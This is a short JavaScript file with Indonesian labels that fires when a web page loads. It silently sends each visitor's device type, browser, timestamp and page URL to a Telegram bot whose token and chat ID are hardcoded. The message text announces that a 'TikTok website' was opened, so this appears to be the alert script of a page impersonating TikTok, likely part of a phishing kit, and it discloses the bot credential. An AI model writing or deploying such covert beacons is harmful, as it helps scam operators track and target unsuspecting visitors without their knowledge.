const TELEGRAM_BOT = "8206994792:AAGo26LadC8a86sF9VRiL_Q_S39FCbRMlZQ";
const TELEGRAM_CHAT = "6452266025";

/* =========================
   TELEGRAM OPEN NOTIF
========================= */
function sendOpenNotif() {
  const info = getBrowserInfo();
  
  const message = `
🌐 WEBSITE TIKTOK DIBUKA 
📱 Device: ${info.device}
🌍 Browser: ${info.browser}
⏰ Waktu: ${new Date().toLocaleString()}
🔗 URL: ${window.location.href}
  `;
  
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT,
        text: message
      })
    })
    .then(res => res.json())
    .then(data => console.log("Telegram OK:", data))
    .catch(err => console.log("Telegram ERROR:", err));
}

/* =========================
   DEVICE INFO
========================= */
function getBrowserInfo() {
  const ua = navigator.userAgent;
  
  let browser = "Unknown";
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";
  
  let device = "Unknown";
  if (ua.includes("Android")) device = "Android";
  else if (ua.includes("iPhone")) device = "iPhone";
  else if (ua.includes("Windows")) device = "Windows";
  else if (ua.includes("Linux")) device = "Linux";
  
  return { browser, device };
}

/* =========================
   AUTO SEND SAAT WEB OPEN
========================= */
window.addEventListener("load", () => {
  sendOpenNotif();
});
